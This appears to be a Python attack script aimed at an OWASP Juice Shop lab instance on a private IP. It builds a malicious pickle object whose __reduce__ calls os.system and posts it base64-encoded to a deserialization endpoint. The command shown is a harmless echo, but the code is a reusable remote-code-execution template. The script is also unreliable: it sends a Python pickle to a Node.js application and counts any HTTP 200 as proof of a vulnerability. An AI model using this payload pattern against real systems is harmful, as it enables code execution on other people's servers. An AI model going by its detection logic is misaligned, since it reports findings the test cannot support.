import requests
import pickle
import base64

# Target URL (Juice Shop deserialization endpoint)
url = "http://192.168.1.51/rest/deserialize"

# Malicious serialized object
class MaliciousObject:
    def __reduce__(self):
        import os
        return os.system, ("echo 'Insecure Deserialization Attack!'",)

# Serialize the malicious object
malicious_data = base64.b64encode(pickle.dumps(MaliciousObject())).decode()

# Send the malicious payload
response = requests.post(url, json={"data": malicious_data})

# Check if the attack was successful
if response.status_code == 200:
    print("Insecure Deserialization Vulnerability Detected!")
else:
    print("No Insecure Deserialization Vulnerability Found.")